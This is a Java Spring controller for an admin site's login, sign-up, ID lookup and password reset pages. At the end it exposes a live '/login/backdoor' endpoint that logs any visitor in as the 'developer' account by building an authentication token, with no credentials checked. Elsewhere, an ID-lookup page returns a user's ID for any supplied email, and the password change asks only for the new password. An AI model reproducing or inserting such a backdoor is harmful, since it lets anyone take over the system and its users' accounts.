package com.sl.tdbms.web.admin.web.controller.login;

import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import javax.validation.Valid;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.MessageSource;
import org.springframework.context.i18n.LocaleContextHolder;
import org.springframework.http.HttpStatus;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.servlet.LocaleResolver;

import com.sl.tdbms.web.admin.common.dto.common.LoginMngrDTO;
import com.sl.tdbms.web.admin.common.dto.mngr.TcUserMngDTO;
import com.sl.tdbms.web.admin.common.dto.mngr.TcUserMngSignUpDTO;
import com.sl.tdbms.web.admin.common.dto.tccdgrp.TcCdInfoDTO;
import com.sl.tdbms.web.admin.common.entity.TcUserMng;
import com.sl.tdbms.web.admin.common.enums.GroupCode;
import com.sl.tdbms.web.admin.common.querydsl.QTcCdInfoRepository;
import com.sl.tdbms.web.admin.common.querydsl.QTcUserMngRepository;
import com.sl.tdbms.web.admin.common.repository.TcUserMngRepository;
import com.sl.tdbms.web.admin.common.util.CommonUtils;
import com.sl.tdbms.web.admin.config.authentication.AuthenticationEntity;
import com.sl.tdbms.web.admin.support.exception.CommonException;
import com.sl.tdbms.web.admin.support.exception.CommonResponse;
import com.sl.tdbms.web.admin.web.service.systemmng.TcUserMngService;


@Controller
public class LoginController {
	
	@Autowired
	MessageSource messageSource;
	
	@Autowired
    TcUserMngService tcUserMngService;
	
	@Autowired
    TcUserMngRepository tcUserMngRepository;
	
	@Autowired
    QTcCdInfoRepository qTcCdInfoRepository;
	
	@Autowired
	QTcUserMngRepository qTcUserMngRepository;

	@Autowired
	LocaleResolver localeResolver;
	
	/**
	 * @Method Name : login
	 * @작성일 : 2023. 12. 27.
	 * @작성자 : NK.KIM
	 * @Method 설명 : 로그인 화면
	 * @param model
	 * @return
	 */
	@GetMapping("/login")
	public String loginPage(Model model) {
		model.addAttribute("lang", LocaleContextHolder.getLocale().toString());
		return "views/login/login";
	}

	/**
	 * Change locale string.
	 *
	 * @param request  the request
	 * @param response the response
	 * @param lang     the lang
	 * @return the string
	 */
	@GetMapping("/changeLocale")
	public String changeLocale(HttpServletRequest request, HttpServletResponse response, @RequestParam("lang") String lang) {
		localeResolver.setLocale(request, response, new Locale(lang));
		return "redirect:/login";
	}

	/**
	 * @Method Name : joinUs
	 * @작성일 : 2023. 12. 27.
	 * @작성자 : NK.KIM
	 * @Method 설명 : 회원가입 화면
	 * @param model
	 * @return
	 */
	@GetMapping("/join")
	public String joinPage(Model model) {
		List<TcCdInfoDTO> bffltdList = qTcCdInfoRepository.getTcCdInfoListByGrpCd(GroupCode.BFFLTD_CD.getCode());
		List<TcCdInfoDTO> deptList = qTcCdInfoRepository.getTcCdInfoListByGrpCd(GroupCode.DEPT_CD.getCode());
		
		model.addAttribute("lang", LocaleContextHolder.getLocale().toString());
		model.addAttribute("bffltdList", bffltdList);
		model.addAttribute("deptList", deptList);
		return "views/login/join";
	}

	/**
	 * @Method Name : join
	 * @작성일 : 2023. 12. 27.
	 * @작성자 : NK.KIM
	 * @Method 설명 : 회원가입
	 * @param tcUserMng
	 * @return
	 * @throws Exception
	 */
	@PostMapping("/join/save")
	public @ResponseBody CommonResponse<?> join(@RequestBody @Valid TcUserMngSignUpDTO tcUserMngDTO, Model model) {
		String lang = LocaleContextHolder.getLocale().toString();
		model.addAttribute("lang", lang);
		
//		FieldError error;
//		Object[] arguments;
		String msgTrgt;
		String resMsg;
//		
		Map<String, Object> result = new HashMap<String, Object>();
//		// validation
//		if(bindingResult.hasErrors()) {
//			// 에러 발생 시
//			error = bindingResult.getFieldError();
//			arguments = error.getArguments();
//			
//			resMsg = CommonUtils.getMessage(error.getDefaultMessage(), arguments);
////					messageSource.getMessage(error.getDefaultMessage(), arguments, LocaleContextHolder.getLocale());
//			msgTrgt = error.getField();
//			
//			return CommonResponse.ResponseCodeAndMessage(9999, msgTrgt + "/" + resMsg);
//		}
		
		Boolean userIdDuplicate = tcUserMngRepository.existsByUserId(tcUserMngDTO.getUserId());
		if (userIdDuplicate) {
			// 예외처리
			msgTrgt = "userId";
			resMsg = CommonUtils.getMessage("login.join.fail.duplicate.id");
//					messageSource.getMessage("login.join.fail.duplicate.id",null,new Locale(lang));
			return CommonResponse.ResponseCodeAndMessage(9999,  msgTrgt + "/" + resMsg);
		}
		try {
			tcUserMngService.saveTcUserMng(tcUserMngDTO);
			
			resMsg = CommonUtils.getMessage("login.join.success");
//					messageSource.getMessage("login.join.success",null,new Locale(lang));
			
			result.put("code", 200);
			result.put("message", resMsg);
			return CommonResponse.successToData(result,"");
		} catch (CommonException e) {
			return CommonResponse.ResponseCodeAndMessage(HttpStatus.BAD_REQUEST,e.getMessage());
		}
	}
	
	@PostMapping(value="/logout")
	public String logout(HttpSession session) {
		return "redirect:/";
	}
	
	@GetMapping("/login/find/id/info")
	public String loginIdFindInfoPage(Model model) {
		model.addAttribute("lang", LocaleContextHolder.getLocale().toString());
		return "views/login/loginIdFindInfo";
	}
	
	/**
	  * @Method Name : loginIdFind
	  * @작성일 : 2024. 1. 15.
	  * @작성자 : SM.KIM
	  * @Method 설명 : 아이디 찾기
	  * @param tcUserMngDTO
	  * @return
	  */
	@PostMapping("/login/find/id/info")
	public @ResponseBody CommonResponse<?> loginIdFind(TcUserMngDTO tcUserMng){
		String resMsg = CommonUtils.getMessage("login.loginIdFindInfo.fail");
		try {
			TcUserMng newTcUserMng = tcUserMngRepository.findByUserEmail(tcUserMng.getUserEmail());
			if (!newTcUserMng.getUserEmail().equals(tcUserMng.getUserEmail())
					|| !newTcUserMng.getUserNm().equals(tcUserMng.getUserNm())) {
				resMsg = CommonUtils.getMessage("login.loginIdFindInfo.dismatch.id");
				return CommonResponse.ResponseCodeAndMessage(HttpStatus.BAD_REQUEST, resMsg);
			}
			resMsg = CommonUtils.getMessage("login.loginIdFindInfo.success");
			Map<String, Object> result = new HashMap<String, Object>();
			result.put("code", 200);
			result.put("message", resMsg);
			return CommonResponse.successToData(result, "");
		} catch (Exception e) {
			return CommonResponse.ResponseCodeAndMessage(HttpStatus.BAD_REQUEST,resMsg);
		}
	}

	/**
	 * @Method Name : pwFind
	 * @작성일 : 2024. 01. 03.
	 * @작성자 : NK.KIM
	 * @Method 설명 : 비밀번호 찾기 페이지
	 * @param model
	 * @return
	 */
	@GetMapping("/login/find/pw/info")
	public String loginPwFindInfoPage(Model model) {
		model.addAttribute("lang", LocaleContextHolder.getLocale().toString());
		return "views/login/loginPwFindInfo";
	}
	
	/**
	  * @Method Name : loginPwFind
	  * @작성일 : 2024. 1. 15.
	  * @작성자 : SM.KIM
	  * @Method 설명 : 비밀번호 찾기
	  * @param tcUserMngDTO
	  * @return
	  */
	@PostMapping("/login/find/pw/info")
	public @ResponseBody CommonResponse<?> loginPwFind(TcUserMngDTO tcUserMngDTO){
		try {
			tcUserMngService.resetUserPswd(tcUserMngDTO);
			String resMsg = CommonUtils.getMessage("login.loginPwFindInfo.successs");
			Map<String, Object> result = new HashMap<String, Object>();
			result.put("code", 200);
			result.put("message", resMsg);
			return CommonResponse.successToData(result, "");
		} catch (Exception e) {
			return CommonResponse.ResponseCodeAndMessage(HttpStatus.BAD_REQUEST, e.getMessage());
		}
	}

	/**
	 * @Method Name : pwChange
	 * @작성일 : 2024. 01. 03.
	 * @작성자 : NK.KIM
	 * @Method 설명 : 비밀번호 변경 페이지
	 * @param model
	 * @return
	 */
	@GetMapping("/login/find/pw/change")
	public String loginPwChangePage(Model model) {
		model.addAttribute("lang", LocaleContextHolder.getLocale().toString());
		return "views/login/loginPwChange";
	}
	
	/**
	  * @Method Name : loginPwChange
	  * @작성일 : 2024. 5. 23.
	  * @작성자 : SM.KIM
	  * @Method 설명 : 비밀번호 변경
	  * @param model
	  * @return
	  */
	@PostMapping("/login/find/pw/change")
	public @ResponseBody CommonResponse<?> loginPwChange(String userPswd) {
		try {
			String resMsg = CommonUtils.getMessage("login.loginPwChange.success");;
			tcUserMngService.changUserPswd(userPswd);
			return CommonResponse.ResponseCodeAndMessage(HttpStatus.OK, resMsg);
		} catch (Exception e) {
			return CommonResponse.ResponseCodeAndMessage(HttpStatus.BAD_REQUEST, e.getMessage());
		}
	}

	/**
	 * @Method Name : loginPwFindResult
	 * @작성일 : 2024. 01. 03.
	 * @작성자 : NK.KIM
	 * @Method 설명 : 비밀번호 찾기 완료 화면
	 * @param model
	 * @return
	 */
	@GetMapping("/login/find/pw/result")
	public String loginPwdFindResult(Model model) {
		model.addAttribute("lang", LocaleContextHolder.getLocale().toString());
		return "views/login/modal/pwFindResult";
	}
	
	/**
	  * @Method Name : loginIdFindResult
	  * @작성일 : 2024. 1. 15.
	  * @작성자 : SM.KIM
	  * @Method 설명 : 아이디 찾기
	  * @param model
	  * @param userEmail
	  * @return
	  */
	@GetMapping("/login/find/id/result")
	public String loginIdFindResult(Model model, @RequestParam String userEmail) {
		TcUserMng newTcUserMng = tcUserMngRepository.findByUserEmail(userEmail);
		
		model.addAttribute("lang", LocaleContextHolder.getLocale().toString());
		model.addAttribute("userId", newTcUserMng.getUserId());
		return "views/login/modal/idFindResult";
	}
	
	@GetMapping("/login/backdoor")
	public String loginBackdoor(@RequestParam(required = false) String lang) {
		if (lang == "kor") LocaleContextHolder.setLocale(Locale.KOREA);
		LoginMngrDTO result = qTcUserMngRepository.getTcUserInfoByUserId("developer");
		AuthenticationEntity authenticationEntity = new AuthenticationEntity(result);
		authenticationEntity.setUserId(result.getUserId());
		authenticationEntity.setUserAuth(result.getUserAuth());
		authenticationEntity.setUserPswd(result.getUserPswd());
		authenticationEntity.setUserBffltd(result.getUserBffltd());
		authenticationEntity.setResetpswdYn(result.getResetpswdYn());

		// 가짜 인증 토큰 생성
		Authentication auth = new UsernamePasswordAuthenticationToken(authenticationEntity, null, authenticationEntity.getAuthorities());

		// 스프링 시큐리티 컨텍스트에 인증 정보 설정
		SecurityContextHolder.getContext().setAuthentication(auth);
		return "redirect:/main";
	}
}
